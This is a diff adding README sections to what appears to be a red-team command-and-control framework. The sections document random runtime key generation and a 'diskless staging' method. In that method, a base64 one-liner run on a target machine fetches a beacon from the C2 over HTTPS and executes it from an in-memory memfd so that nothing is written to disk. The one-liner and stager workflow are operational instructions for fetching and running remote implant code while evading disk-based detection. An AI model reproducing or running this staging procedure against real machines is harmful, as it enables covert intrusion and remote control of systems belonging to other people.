@@ -51,6 +51,22 @@ You should see:
 To use a port other than 7070, set `BSB_C2_PORT=8080` in the
 environment.
 
+If `config.json` does not set `c2.port`, `crypto` keys, `c2.client_id`
+or `server.stage_token` (and the matching env vars are unset), the
+server **generates them at random on every run** and prints them:
+
+```
+[*] Random runtime values (not provided; fresh every run):
+    client_id: bsb-7020c4ae
+    master_key_hex: a65af99f...
+    port: 57805
+    stage_token: fe29967d...
+```
+
+Values you provide explicitly always win. The values served through
+`/stage/config` are the runtime ones, so a fileless beacon always
+agrees with the server run that spawned it.
+
 ## 5. Copy a BOF onto the C2
 
 ```
@@ -123,6 +139,53 @@ ssh user@target /opt/bsb/beacon
 
 `make install-all` is only needed for shipping to another machine.
 For local development, `./build/beacon` is enough.
+
+## 11. Diskless staging (fileless execution)
+
+The C2 can serve the compiled beacon and its config through token-gated
+staging endpoints. The stager fetches both over HTTPS, decodes them in
+RAM and executes the beacon from an anonymous `memfd`: no ELF, no
+config, nothing ever touches the target's disk.
+
+1. Configure the staging token in `config.json` (`server` section):
+
+   ```json
+   "server": {
+     "stage_token": "GENERATE_A_RANDOM_HEX_STRING",
+     "stage_beacon_path": "build/beacon"
+   }
+   ```
+
+2. Start the C2. It prints the Stage-0 one-liner and copies it to the
+   clipboard (needs `xclip`, `xsel` or `wl-copy`):
+
+   ```
+   python3 c2/server.py
+   ```
+
+3. Run the one-liner on the target (bash + python3 only, no disk writes):
+
+   ```
+   echo <b64> | base64 -d | BSB_STAGE_URL='https://c2:7070' \
+     BSB_STAGE_TOKEN='<token>' python3 -
+   ```
+
+Manual variant: `bash c2/stage_oneliner.sh` with the same environment
+variables (see `c2/stage_payload.py` for the full contract).
+
+**How the packing works (and how honest it is):** the payload and the
+config are obfuscated with three XOR layers whose keys are derived from
+the staging token with HKDF-SHA256. The token is the gate and the key
+material — anyone holding the token decodes everything, and traffic
+captured *before* TLS terminates sees the token in the URL. Deploy
+staging behind TLS (`server.tls_cert` / `server.tls_key`) or terminate
+TLS in front of the C2. The real channel security remains the AES-CFB
++ HMAC + replay protection of the beacon protocol, and the AES key
+inside `config.json` is the secret worth rotating after an engagement.
+
+This is **diskless staging**, not invisibility: `memfd_create` +
+`execveat` leave no file behind, but `open`-less execution is still
+visible to eBPF-based EDRs watching `memfd` executions.
 
 ## Troubleshooting
 
